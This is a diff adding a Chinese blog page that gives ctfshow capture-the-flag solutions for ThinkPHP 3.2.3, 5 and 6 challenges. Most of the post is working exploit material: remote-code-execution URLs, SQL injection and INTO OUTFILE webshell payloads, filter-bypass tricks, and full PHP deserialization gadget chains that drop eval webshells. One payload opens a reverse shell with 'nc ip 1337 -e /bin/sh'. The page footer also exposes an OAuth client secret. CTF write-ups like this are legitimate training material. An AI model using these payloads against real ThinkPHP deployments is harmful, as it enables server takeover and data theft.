@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>[ctfshow]ThinkPHP专题 | fallingskies</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1717739446385">
+<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="web569
+考察thinkphp3.2.3版本的路由格式
+thinkphp3.2.3手册
+# 模块/控制器/方法/参数名/参数值
+
+PATHINFO模式
+/index.php/Admin/Login/ctfshowLogin
+
+普通模式
+..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://fallingskies22.github.io">
+        <img src="https://fallingskies22.github.io/images/avatar.png?v=1717739446385" class="site-logo">
+        <h1 class="site-title">fallingskies</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/post/friends" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      <h3>想要去月球<h3>
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">[ctfshow]ThinkPHP专题</h2>
+            <div class="post-date">2024-03-22</div>
+            
+              <div class="feature-container" style="background-image: url('https://fallingskies22.github.io/post-images/ctfshowthinkphp-zhuan-ti.png')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <h2 id="web569">web569</h2>
+<p>考察thinkphp3.2.3版本的路由格式<br>
+<a href="https://www.kancloud.cn/manual/thinkphp/1678">thinkphp3.2.3手册</a></p>
+<pre><code># 模块/控制器/方法/参数名/参数值
+
+PATHINFO模式
+/index.php/Admin/Login/ctfshowLogin
+
+普通模式
+/index.php?m=Admin&amp;c=Login&amp;f=ctfshowLogin
+
+兼容模式
+/index.php?s=Admin/Login/ctfshowLogin
+
+REWRITE模式
+/Admin/Login/ctfshowLogin
+</code></pre>
+<h2 id="web570">web570</h2>
+<p>有一条添加的路由规则<br>
+<img src="https://fallingskies22.github.io/post-images/1711070651961.png" alt="" loading="lazy"></p>
+<p>可以直接调用call_user_func执行任意函数<br>
+第一个参数为回调函数，第二个参数只能为回调函数的参数。<br>
+我们使用/ctfshow/system/ls可以执行命令，但无法传递<code>/</code>字符<br>
+使用assert函数，可以将参数解析为php代码。</p>
+<pre><code>/ctfshow/assert/system($_POST[1])
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://fallingskies22.github.io/post-images/1711071910971.png" alt="" loading="lazy"></figure>
+<h2 id="web571">web571</h2>
+<p>下载<a href="https://getcomposer.org/Composer-Setup.exe">composer</a><br>
+一键搭建环境</p>
+<pre><code class="language-sh">composer create-project topthink/thinkphp=3.2.3 tp3
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://fallingskies22.github.io/post-images/1711102379628.png" alt="" loading="lazy"></figure>
+<p>下载<a href="https://xdebug.org/wizard">xdebug插件</a><br>
+添加配置信息如下：</p>
+<pre><code>[Xdebug]
+zend_extension = xdebug
+xdebug.collect_params=1
+xdebug.collect_return=1
+xdebug.auto_trace=On
+xdebug.profiler_enable=On
+xdebug.mode=debug
+xdebug.client_host=127.0.0.1
+xdebug.remote_host=127.0.0.1
+xdebug.remote_port=9003
+</code></pre>
+<p>浏览器下载<a href="https://chromewebstore.google.com/detail/xdebug-helper/eadndfjplgieldjbigjakmdgkmoaaaoc">xdebug helper插件</a>后即可开始调试</p>
+<p>我们可以控制传入show函数的变量n<br>
+可以看到经过show函数在TMPL_NEGINE_TYPE是php的时候会执行到eval函数<br>
+<img src="https://fallingskies22.github.io/post-images/1711105187521.png" alt="" loading="lazy"></p>
+<p>这相当于一个ssti</p>
+<pre><code>?n=%3C?php%20system(%27cat%20/flag_is_here%27)?%3E
+</code></pre>
+<h2 id="web572">web572</h2>
+<p>使用<a href="https://github.com/Lotus6/ThinkphpGUI">ThinkphpGUI工具</a>直接能扫出来存在日志泄露。<br>
+<a href="https://github.com/bewhale/thinkphp_gui_tools">另一个工具</a>可以选择日期爆破</p>
+<p>当开启debug模式时，会在Runtime目录下生成log文件，文件名称是<code>年_月_日.log</code>，所以可以爆破出日志文件。<br>
+intruder设置如下进行爆破<br>
+<img src="https://fallingskies22.github.io/post-images/1711106940203.png" alt="" loading="lazy"></p>
+<p>发现<code>/Application/Runtime/Logs/Home/21_04_15.log</code>文件里有命令执行日志</p>
+<pre><code>/index.php?showctf=&lt;?php%20system(&quot;cat%20/flag_is_here&quot;);?&gt;
+</code></pre>
+<h2 id="web573">web573</h2>
+<p>Thinkphp3.2.3版本中存在sql注入漏洞<br>
+但是上面两个工具没有这个漏洞的检测😭</p>
+<p>参考<a href="https://blog.csdn.net/miuzzx/article/details/119424071">分析文章</a></p>
+<p>源码：</p>
+<pre><code class="language-php">class IndexController extends Controller {
+    public function index(){
+        $a = M('xxx');
+        $id = I('GET.id');
+        $b = $a-&gt;find($id);
+        var_dump($b);
+    }
+}
+</code></pre>
+<p>payload</p>
+<pre><code>?id[where]=0 union select 1,TABLE_NAME,1,1 from information_schema.tables where table_schema=&quot;ctfshow&quot; limit 1,1--
+?id[where]=0 union select 1,COLUMN_NAME,1,1 from information_schema.columns where table_name=&quot;flags&quot; limit 1,1--
+?id[where]=0 union select 1,flag4s,1,1 from flags
+</code></pre>
+<h2 id="web574">web574</h2>
+<p>WHERE型注入</p>
+<p>源码</p>
+<pre><code class="language-php">public function index($id=1){
+$name = M('Users')-&gt;where('id='.$id)-&gt;find();
+$this-&gt;show($html);
+}
+</code></pre>
+<p>payload</p>
+<pre><code class="language-sql">0) union select 1,TABLE_NAME,1,1 from information_schema.tables where table_schema=&quot;ctfshow&quot; limit 1,1--
+0) union select 1,COLUMN_NAME,1,1 from information_schema.columns where table_name=&quot;flags&quot; limit 1,1--
+0) union select 1,flag4s,1,1 from flags--
+</code></pre>
+<h2 id="web575">web575</h2>
+<p>反序列化</p>
+<pre><code class="language-php">$user= unserialize(base64_decode(cookie('user')));
+if(!$user || $user-&gt;id!==$id){
+$user = M('Users');
+$user-&gt;find(intval($id));
+cookie('user',base64_encode(serialize($user-&gt;data())));
+}
+$this-&gt;show($user-&gt;username);
+}
+</code></pre>
+<p>可以利用show函数执行命令<br>
+payload</p>
+<pre><code class="language-php">&lt;?php
+
+namespace Home\Controller{
+    class IndexController{
+        public $id='1';
+        public $username='&lt;?php system(&quot;nc ip 1337 -e /bin/sh&quot;);?&gt;';
+    }
+}
+
+namespace{
+    use Home\Controller\IndexController;
+    echo base64_encode(serialize(new IndexController));
+}
+?&gt;
+</code></pre>
+<p>修改cookie同时GET传入id=1</p>
+<p>因为thinkphp3.2.3本身是存在反序列化链的，也可以换一种方法。(这里省略了)<br>
+限制比较多：需要php5（当然这里肯定是）。<br>
+利用任意文件读，无法确定flag位置。<br>
+详细参考https://blog.csdn.net/miuzzx/article/details/119424101</p>
+<h2 id="web576">web576</h2>
+<p>COMMENT型注入</p>
+<pre><code class="language-php">$user = M('Users')-&gt;comment($id)-&gt;find(intval($id));
+</code></pre>
+<p>调试程序发现<code>parseComment()</code>函数<br>
+<img src="https://fallingskies22.github.io/post-images/1712131844797.png" alt="" loading="lazy"><br>
+使用<code>/**/</code>进行注释，我们可以输入<code>*/</code>来闭合进行注入。</p>
+<p>这种属于<a href="https://forum.butian.net/share/393">limit注入</a><br>
+我这里尝试了不能使用union</p>
+<p>payload</p>
+<pre><code>1*/ into outfile &quot;/var/www/html/1.php&quot; lines terminated by &quot;&lt;?php eval($_POST[1]);?&gt;&quot;/*
+</code></pre>
+<h2 id="web577">web577</h2>
+<p>WHERE型注入</p>
+<pre><code class="language-php">$map=array(
+'id'=&gt;$_GET['id']
+);
+$user = M('Users')-&gt;where($map)-&gt;find();
+</code></pre>
+<p>这里使用ThinkPHP3.2.3的exp，bind注入。<br>
+exp,bind是ThinkPHP3.2.3提供的一种表达式查询功能，参考<a href="https://www.kancloud.cn/manual/thinkphp/1768">手册</a></p>
+<p>关键在<code>parseWhereItem()</code>函数<br>
+当数组第一个值为bind或exp时，会直接将第二个值拼接到sql语句中。<br>
+<img src="https://fallingskies22.github.io/post-images/1712135738430.png" alt="" loading="lazy"></p>
+<p>前面有一个字段类型验证，但这里$val是一个数组，<a href="https://www.runoob.com/php/php-is_scalar-function.html">is_scalar()函数</a>会返回false。</p>
+<figure data-type="image" tabindex="3"><img src="https://fallingskies22.github.io/post-images/1712136530244.png" alt="" loading="lazy"></figure>
+<p>payload</p>
+<pre><code>?id[0]=exp&amp;id[1]==0 union select 1,flag4s,2,3 from flags--+
+</code></pre>
+<h2 id="web578">web578</h2>
+<p>变量覆盖+模板注入</p>
+<pre><code class="language-php">public function index($name='',$from='ctfshow'){
+$this-&gt;assign($name,$from);
+$this-&gt;display('index');
+}
+</code></pre>
+<p>ThinkPHP默认模板引擎设置是text/html</p>
+<p><code>ThinkPHP/Conf/convention.php</code></p>
+<pre><code>/* 模板引擎设置 */
+    'TMPL_CONTENT_TYPE'      =&gt; 'text/html', // 默认模板输出类型
+</code></pre>
+<p>这题设置为了php，才能够利用。</p>
+<p>我们使用assign函数赋值进行变量覆盖$_contents变量，当$_contents非空时会进入到eval函数中。</p>
+<figure data-type="image" tabindex="4"><img src="https://fallingskies22.github.io/post-images/1712138437365.png" alt="" loading="lazy"></figure>
+<p>payload</p>
+<pre><code>?name=_content&amp;from=&lt;?php%20phpinfo();?&gt;
+</code></pre>
+<p>查看assign函数细节，当$name为数组时可以直接进行赋值，而不需要$value。<br>
+<img src="https://fallingskies22.github.io/post-images/1712138634219.png" alt="" loading="lazy"></p>
+<p>换一种payload</p>
+<pre><code>?name[_content]=&lt;?php%20phpinfo();?&gt;
+</code></pre>
+<h2 id="web579">web579</h2>
+<p>ThinkPHP5 未开启强制路由RCE</p>
+<p>payload</p>
+<pre><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][0]=cat%20/flag_is_here
+</code></pre>
+<h2 id="web604">web604</h2>
+<p>继续使用上题的payload，提示invokefunction被禁用了。<br>
+尝试其他控制器。</p>
+<p>payload</p>
+<pre><code>?s=index/think\request/input?data[0]=cat%20../../../../flag_heeeeae&amp;filter=system
+</code></pre>
+<h2 id="web605">web605</h2>
+<p>过滤了input和display</p>
+<p>使用这个显示找不到类，有点不懂。</p>
+<pre><code>?s=index/\think\view\driver\Php/display&amp;content=&lt;?php phpinfo();?&gt;
+</code></pre>
+<p>使用这个可以写shell</p>
+<pre><code>?s=index/\think\template\driver\File/write&amp;cacheFile=shell.php&amp;content=&lt;?php%20phpinfo();?&gt;
+</code></pre>
+<h2 id="web606">web606</h2>
+<p>将write也过滤了</p>
+<p>总结一下，一共过滤了</p>
+<pre><code>invokefunction、display、input、write
+</code></pre>
+<p>使用大小写即可绕过</p>
+<pre><code>?s=index/\think\app/invokeFunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][0]=cat%20/flag_heeeeae
+</code></pre>
+<h2 id="web607">web607</h2>
+<h2 id="web608">web608</h2>
+<h2 id="web609">web609</h2>
+<h2 id="web610">web610</h2>
+<p>同样大小写绕过</p>
+<h2 id="web611">web611</h2>
+<p>考察ThinkPHP5的反序列化利用链。</p>
+<p>payload</p>
+<pre><code class="language-php">&lt;?php
+namespace think;
+abstract class Model{
+    protected $append = [];
+    private $data = [];
+    function __construct(){
+        $this-&gt;append = [&quot;a&quot;=&gt;[&quot;a&quot;,&quot;a&quot;]];
+        $this-&gt;data = [&quot;a&quot;=&gt;new Request()];
+    }
+}
+
+class Request
+{
+    protected $hook = [];
+    protected $filter = &quot;&quot;;
+    protected $config = [];
+    function __construct(){
+        $this-&gt;filter = &quot;system&quot;;
+        $this-&gt;config = [&quot;var_ajax&quot;=&gt;''];
+        $this-&gt;hook = [&quot;visible&quot;=&gt;[$this,&quot;isAjax&quot;]];
+    }
+}
+
+
+namespace think\process\pipes;
+
+//use think\model\concern\Conversion;
+use think\model\Pivot;
+class Windows
+{
+    private $files = [];
+
+    public function __construct()
+    {
+        $this-&gt;files=[new Pivot()];
+    }
+}
+
+
+namespace think\model;
+
+use think\Model;
+class Pivot extends Model
+{
+}
+
+
+use think\process\pipes\Windows;
+echo urlencode(serialize(new Windows()));
+?&gt;
+</code></pre>
+<p>POST传入反序列化数据，GET传入命令执行参数。</p>
+<h2 id="web612">web612</h2>
+<p>修改上题中<code>isAjax</code>为<code>isPjax</code></p>
+<pre><code class="language-php">$this-&gt;hook['visible'] = [$this, 'isPjax'];
+$this-&gt;config['var_pjax'] = '';
+</code></pre>
+<h2 id="web613">web613</h2>
+<h2 id="web614">web614</h2>
+<h2 id="web615">web615</h2>
+<h2 id="web616">web616</h2>
+<h2 id="web617">web617</h2>
+<h2 id="web618">web618</h2>
+<h2 id="web619">web619</h2>
+<h2 id="web620">web620</h2>
+<h2 id="web621">web621</h2>
+<p>使用Reqeust</p>
+<pre><code class="language-php">$this-&gt;hook['visible'] = [$this, 'Request'];
+</code></pre>
+<h2 id="web622">web622</h2>
+<h2 id="web623">web623</h2>
+<p>考察ThinkPHP6的反序列化利用链</p>
+<p>payload</p>
+<pre><code class="language-php">&lt;?php
+
+namespace think {
+
+    use think\route\Url;
+
+    abstract class Model
+    {
+        private $lazySave;
+        private $exists;
+        protected $withEvent;
+        protected $table;
+        private $data;
+        private $force;
+        public function __construct()
+        {
+            $this-&gt;lazySave = true;
+            $this-&gt;withEvent = false;
+            $this-&gt;exists = true;
+            $this-&gt;table = new Url();
+            $this-&gt;force = true;
+            $this-&gt;data = [&quot;1&quot;];
+        }
+    }
+}
+
+namespace think\model {
+
+    use think\Model;
+
+    class Pivot extends Model
+    {
+        function __construct()
+        {
+            parent::__construct();
+        }
+    }
+    $b = new Pivot();
+    echo urlencode(serialize($b));
+}
+
+namespace think\route {
+
+    use think\Middleware;
+    use think\Validate;
+
+    class Url
+    {
+        protected $url;
+        protected $domain;
+        protected $app;
+        protected $route;
+        public function __construct()
+        {
+            $this-&gt;url = 'a:';
+            $this-&gt;domain = &quot;&lt;?php system('whoami');?&gt;&quot;;
+            $this-&gt;app = new Middleware();
+            $this-&gt;route = new Validate();
+        }
+    }
+}
+
+namespace think {
+
+    use think\view\driver\Php;
+
+    class Validate
+    {
+        public function __construct()
+        {
+            $this-&gt;type['getDomainBind'] = [new Php(), 'display'];
+        }
+    }
+    class Middleware
+    {
+        public function __construct()
+        {
+            $this-&gt;request = &quot;2333&quot;;
+        }
+    }
+}
+
+namespace think\view\driver {
+    class Php
+    {
+        public function __construct()
+        {
+        }
+    }
+}
+</code></pre>
+<h2 id="web624">web624</h2>
+<h2 id="web625">web625</h2>
+<p>换一条利用链，直接写shell</p>
+<pre><code class="language-php">&lt;?php
+namespace League\Flysystem\Cached\Storage{
+    use League\Flysystem\Adapter\Local;
+
+    class Adapter{
+        protected $autosave = true;
+        protected $expire = null;
+        protected $adapter;
+        protected $file;
+
+        public function __construct()
+        {
+            $this-&gt;autosave = false;
+            $this-&gt;expire = '&lt;?php @eval($_POST[1]);?&gt;';
+            $this-&gt;adapter = new Local();
+            $this-&gt;file = '1.php';
+        }
+    }
+}
+
+namespace League\Flysystem\Adapter{
+    class Local{
+
+    }
+}
+
+namespace {
+    use League\Flysystem\Cached\Storage\Adapter;
+
+    echo urlencode(serialize(new Adapter()));
+}
+</code></pre>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://fallingskies22.github.io/post/ctfshowxss/">
+                  <h3 class="post-title">
+                    [ctfshow]XSS
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '1b08861b8ad19018640e',
+        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
+        repo: 'fallingskies22.github.io',
+        owner: 'fallingskies22',
+        admin: ['fallingskies22'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
